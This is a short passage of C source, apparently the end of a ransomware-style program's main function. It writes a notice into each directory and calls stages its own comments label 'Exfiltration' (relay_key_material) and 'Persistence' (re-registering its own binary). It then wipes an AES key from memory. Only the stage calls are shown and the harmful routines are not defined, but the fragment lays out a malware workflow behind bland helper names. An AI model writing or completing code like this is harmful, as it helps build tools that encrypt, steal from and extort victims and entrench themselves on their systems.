    for (size_t i = 0; i < dir_cnt; i++) {
        write_status_notice(dirs[i]);
        free(dirs[i]);
    }
    free(dirs);

    /* 5) Exfiltration */
    relay_key_material();

    /* 6) Persistence */
    UTILITY_BIN_PATH = argv[0];
    perform_post_processing();

    /* Cleanup */
    free_file_info_array(files, file_count);
    OPENSSL_cleanse(aes_key, sizeof(aes_key));

    return 0;
}